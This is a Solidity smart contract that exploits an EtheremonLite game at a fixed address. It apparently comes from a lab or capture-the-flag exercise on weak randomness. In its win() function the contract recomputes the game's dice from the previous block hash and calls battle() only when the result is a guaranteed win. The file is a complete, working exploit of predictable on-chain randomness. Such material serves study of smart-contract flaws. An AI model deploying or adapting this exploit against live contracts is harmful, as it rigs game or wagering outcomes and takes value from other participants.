pragma solidity ^0.4.0;

import "./EthermonLite.sol";

contract WinnerWinnerChickenDinner {
    EtheremonLite public ethermon = EtheremonLite(0xf3259eec5b4a46748a1f608ec3d74b89058bb3ad);
    string monsterName = "dmf86";

    constructor() public {
        ethermon.initMonster(monsterName);
    }
    
    function win() public {
        uint battleRatio = 3;
        uint dice = uint(blockhash(block.number - 1));
        dice = dice / 85; // Divide the dice by 85 to add obfuscation
        
        // Only battle if we know we will win
        if (dice % battleRatio == 0) ethermon.battle();
    }
}